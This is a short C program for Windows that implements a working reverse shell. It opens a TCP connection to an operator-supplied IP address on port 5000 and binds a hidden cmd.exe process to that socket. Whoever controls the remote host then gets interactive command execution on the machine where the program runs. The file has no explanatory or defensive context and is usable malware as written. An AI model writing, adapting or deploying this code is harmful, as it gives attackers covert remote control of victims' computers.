#define WIN32_LEAN_AND_MEAN

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <stdio.h>
#include <process.h>
#include <sys/types.h>
#include <io.h>

#pragma comment(lib, "Ws2_32.lib")

#define PORT "5000"

#define LOCALTEST

#if !defined(LOCALTEST)
#define IPADDR "YOURPUBLICIP"
#else
#define IPADDR "YOURLOCALIP"
#endif

int main(int argc, char* argv[]) {

	WSADATA WsaData;

	if (WSAStartup(MAKEWORD(2, 2), &WsaData) != 0) {
		return 1;
	}

	struct addrinfo hints, * p, * servinfo;

	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;

	SOCKET sockfd;

	getaddrinfo(IPADDR, PORT, &hints, &servinfo);

	for (p=servinfo; p != NULL; p = p->ai_next) {
		if ((sockfd = WSASocketW(p->ai_family, p->ai_socktype, p->ai_protocol, NULL, 0, 0)) == -1) {
			continue;
		}

		if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
			continue;
		}

		break;
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof sinfo);
	sinfo.cb = sizeof sinfo;
	sinfo.dwFlags = STARTF_USESTDHANDLES;
	sinfo.hStdInput = (HANDLE)sockfd;
	sinfo.hStdOutput = (HANDLE)sockfd;
	sinfo.hStdError = (HANDLE)sockfd;

	PROCESS_INFORMATION pinfo;

	// Windows magic

	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return 0;
}